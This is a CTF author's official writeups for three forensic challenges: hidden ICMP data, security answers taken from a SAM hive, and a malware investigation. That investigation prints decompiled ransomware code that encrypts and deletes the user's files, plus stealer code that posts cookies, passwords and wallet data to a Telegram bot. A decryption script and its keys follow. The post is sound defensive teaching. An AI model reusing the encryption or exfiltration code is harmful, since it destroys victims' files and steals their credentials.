---
layout: post
title: World Wide CTF 2024 - Official Forensic Writeups
description: All solutions for all forensic challenges
tags: [WWF, Writeup, Command and Control, Telegram, Powershell, Blue Team, Python]
---

Hi guys, I'm Odin who is the author of Forensic category, I felt very happy since y'all enjoyed my challenges though it was my first time. As usual in any CTF, 
I will show you the official writeup for it. Let's go!

![image](https://github.com/user-attachments/assets/a70e20f8-9ee4-4d88-916f-3838e65e3b64)

### Too Hidden
In this challenge I gave u a pcapng file and your mission is to find the secret inside. Basically, we will open it by using Wireshark:

![image](https://github.com/user-attachments/assets/4910dccb-c0e8-470d-a0ed-4192bb5cd049)

There are many ICMP packets and normally you can try to find the difference between each packet and if you look carefully you will see the data in each packet changed 
frequently:

![image](https://github.com/user-attachments/assets/442a0f0b-1142-4b68-8dc6-03082b7ac820)

![image](https://github.com/user-attachments/assets/ad0e09f0-aa47-40e4-af36-3aa4bc0c9bd2)

It's very suspicious, right? From here we will extract the data -> try to decode it by using ASCII table: 

![image](https://github.com/user-attachments/assets/f60bad33-c1eb-47dd-bb90-feabc59df01e)

![image](https://github.com/user-attachments/assets/9e903026-13e4-4d90-9c8a-bf66a2b321bf)

The result will be the Morse string, decode again and you will get the flag: 

![image](https://github.com/user-attachments/assets/d99a7c20-a0d0-44b9-af8e-82d36f87e429)

**Flag: wwf{HOLY_SHEEEET_YOU_CAN_FIND_ME_??????????}**

### Forgot Password
The description was very clear, I asked you to recover the security questions which are very important if we forgot password and we want to recover. In Windows there is 
a component which stores data related to user account and security questions called **SAM**, its location in **System32/config**. By using **Registry Explorer**, we will import 
SAM and navigating to **SAM/Domain/Account/Users**, you will get the flag:

![image](https://github.com/user-attachments/assets/199c8a4e-d991-4479-aaa7-862e511044de)

**{"version":1,"questions":[{"question":"What was your first pet’s name?","answer":"wwf{I_love_"},
{"question":"What’s the name of the city where you were born?","answer":"security_questions_"},
{"question":"What was your childhood nickname?","answer":"s0_muChhhhhhhhhhhhhhhhh}"}]}**

**Flag: wwf{I_love_ security_questions_ s0_muChhhhhhhhhhhhhhhhh}**

### Black Meet Wukong
Now it's the challenge that I love the most and it's so interesting that y'all had so many methods to solve it and I learnt many things. Now it's my solution, first open 
AD1 file by using FTK Imager: 

![image](https://github.com/user-attachments/assets/464e6f9c-3076-48c2-a0a1-16d3894a9ac1)

The first thing when I met these case is that I try to think about how they could attack to the computer. When they got access to target, they might download their payload from their machine or somewhere 
on the Internet and execute it, so the first step I always check their browser history! In this system I just left Edge as the default browser, so to check history we will find **History** file:

![image](https://github.com/user-attachments/assets/84c97bb2-4f3d-4a2b-9f23-40058b67f2a9)

Extract **History** file and open it by using **DBBrowser**, you will find the history: 

![image](https://github.com/user-attachments/assets/a5bac5e9-d5f6-4248-b402-8ac90cd94a61)

You can see that they downloaded a zip file which is very suspicious. Next we will try to find their activities through Windows Event Log file. In **winevt** folder 
you will see there are so many logs and the suspicious thing is that Windows recorded Powershell activities! Extract it, open it by Event Viewer to read the log:

![image](https://github.com/user-attachments/assets/449d9a5a-7800-475f-bd7a-90596efa2747)

Inside the log it recorded a base64 string, decode it and you will get the location of the payload: 

![image](https://github.com/user-attachments/assets/b2a632e8-bcca-434f-9937-e29a6e51e72a)

The hunt is on! The file was packed by PyInstaller so it's easy to extract full source by using **pyinstxtractor-ng**:

![image](https://github.com/user-attachments/assets/4c1ce487-ee68-4e2e-b683-68606e3e1954)

Extract **bLAcKmEeTWUkOng.pyc** and using [pylingual](https://pylingual.io/) to decompile pyc file:

![image](https://github.com/user-attachments/assets/824aefdf-856d-455e-922d-0c2549487f56)

Because the source was kinda long, I will summarize some main functions of the file. First they will encrypt the file:
```python
def god_bless_aes(data, key):
    key = key.encode('utf-8')
    cipher = AES.new(key, AES.MODE_ECB)
    padded_text = pad(data, AES.block_size)
    cipher_text = cipher.encrypt(padded_text)
    return cipher_text

def xoriiiiiiiiiii(data, key):
    return bytearray([b ^ key[i % len(key)] for i, b in enumerate(data)])

def crypter_fichier(file_path, output_path):
    with open(file_path, 'rb') as file:
        original_data = file.read()
    encrypted_data = original_data
    for key in key_fernet:
        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(encrypted_data)
    encrypted_data = xoriiiiiiiiiii(encrypted_data, key_fernet[0])
    final = god_bless_aes(encrypted_data, key_xori)
    with open(output_path, 'wb') as enc_file:
        enc_file.write(final)
path_list = ['C:\\Users\\{}\\Documents'.format(PC_username), 'C:\\Users\\{}\\Pictures'.format(PC_username), 'C:\\Users\\{}\\Desktop'.format(PC_username), 'C:\\Users\\{}\\Downloads'.format(PC_username)]
fname = []
for path in path_list:
    for root, d_names, f_names in os.walk(path):
        for f in f_names:
            fname.append(os.path.join(root, f))
for file in fname:
    if 'desktop.ini' not in file:
        crypter_fichier(file, file + '.odin')
        os.system('del \"{}\"'.format(file))
```
Second, it will steal data of computer and send it to Telegram link: 
```python
    info = f'<b>====== Stealer Logs =======</b>\n<b>==== PC Infomation ====</b>\nName: {InfoLog.FileName}\nIP: {InfoLog.IP}\nCountry: {InfoLog.Country}\nDate: {InfoLog.Date}\n<b>==== Browser Data ====</b>\nCookies: {Counter.CookiesCount}\nPasswords: {Counter.PasswordCount}\n<b>==== Wallets ====</b>\n'
    filename = f'{InfoLog.Country}-{InfoLog.IP}-{InfoLog.Date}'
    files = {'document': (filename + '.zip', open(zipf, 'rb'), 'text/plain')}
    data = {'chat_id': TCHATID, 'caption': info, 'parse_mode': 'HTML'}
    url = f'https://api.telegram.org/bot{TAPI}/sendDocument'
    response = requests.post(url=url, files=files, data=data)
    if response.status_code == 200:
        print('Done')
```

You will see that there are 4 directories encrypted by the malware, and this is script to decrypt it: 
```python
from cryptography.fernet import Fernet
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import os

key_fernet = [
    b'zTskoYGm68VrSiOM6J9W0PqyKTfSyraM0NydVmJvM_k=', b'pcD23bRQTL1MqLS84NdPsiPdYJlwbTaal6JmulzTq4k=',
    b'9EBQNDjmy0rGXCbVgVnrgFFsAHk4Ye1M8y1GSIx9CPY=', b'663RnK5l0MQzewfpAQfYhJbL3p7ZRoR-j7I3DkXiUIk=',
    b'I5Arxkgfo2E56VBVctFjJ-pFkeBbQg6QXMuG-gNgqq4=', b'eXP1sKfkTE9PNkWR8rA9jzJqun80yMYPrzMMi65JQpw=',
    b'56S9Sv7zUPL71w6N2OTSwxvFl_a-5zvsN6rxQI97UWU=', b'gZcRMaVftMg_F9E4tNQ_etAR7_PKT_vVfWwWkMSxDQc=',
    b'-XmaKL4uo4p0gM5ARQZtxjZ_5ecK1w53AEkWuiWDIzQ=', b'ikNfBtrrX-9EBI3iKzWnBJW5wNNvi8rM4oT9BLqDJNw=',
    b'uEikHaHAX1B20aB_bcQwUA0aO21Ai-rgYAqGfKxHKJA=', b'deoHTwNvwTOuQjoy5oh9jN_ZQlLbVCvwI47D3sQt8UA=',
    b'xuaD7BqwreniKZAvBO38MO250oO40HXboxhU8--6YQ0=', b'X5GfY_zukIDPKxyzmMYFkps-Av8Ao2TQDPmckrjb3ZQ=',
    b'CAOD7XSW4e-ON33uz5_8h6RZhorDlKg798e1RcEYSlo=', b'dMphwlwO6Qh_FCdbMzseoZsWkQWPFtGx8VSiFAN2SSo=',
    b'q4NfcRieLIKnyBwFEhUxZcR_8A3BFS_n_cIE8sFX8a4=', b'hLfAPR06xuo545qJlzlYko5f9KKuXOBrCBNgzruTV14='
]
key_xori = "y0u_l00k_l1k3_X1sh1_&_b3_my_l4dy"

def god_bless_aes_decrypt(cipher_text, key):
    key = key.encode('utf-8')
    cipher = AES.new(key, AES.MODE_ECB)
    decrypt = cipher.decrypt(cipher_text)
    return unpad(decrypt, AES.block_size)

def xoriiiiiiiiiii_decrypt(data, key):
    return bytearray([b ^ key[i % len(key)] for i, b in enumerate(data)])

def decrypter_fichier(file_path, output_path):
    with open(file_path, "rb") as enc_file:
        encrypted_data = enc_file.read()
    decrypted_data = god_bless_aes_decrypt(encrypted_data, key_xori)
    decrypted_data = xoriiiiiiiiiii_decrypt(decrypted_data, key_fernet[0])
    for key in reversed(key_fernet):
        fernet = Fernet(key)
        decrypted_data = fernet.decrypt(bytes(decrypted_data))
    
    with open(output_path, "wb") as dec_file:
        dec_file.write(decrypted_data)
```
After decrypted, the first part will be in **wukong.png**:

![image](https://github.com/user-attachments/assets/93a24298-c296-4da3-a0e5-1d59da6f5b5a)

Beside recover the system, I asked you to trace their footprint. In Intelligence it is very important that we can trace attackers activities and from that we can know 
what they did and what they will do. In source code they steal the data and send to the Telegram bot. From here I use a [tool](https://github.com/soxoj/telegram-bot-dumper) which help me dump the message and also it can 
listen the chat:

![image](https://github.com/user-attachments/assets/06780728-3d8b-48fc-bf9e-356cfe5e8f6b)

You will notice that there is a Github link, access it and you will get full source again: 

![image](https://github.com/user-attachments/assets/f14a4392-0f5c-4e9a-bcd6-cbadb162b139)

Look into the source code, in the last line there is a comment which is encoded by base85, decode it and you will get the last part: 

![image](https://github.com/user-attachments/assets/8a89a8c6-6431-4713-94c2-bdd3314614dc)

**Flag: wwf{1_D0WN104D3D_correct_814CK_MY7H_WUK0N6}**

Thank you so much for loving and enjoying my challenge. This is my first time so I could not avoid some mistakes during CTF event, but I felt very happy because you enjoyed 
my challenge so much, it's the biggest motivation for me. See you in the next CTF, love you all 💙💙💙
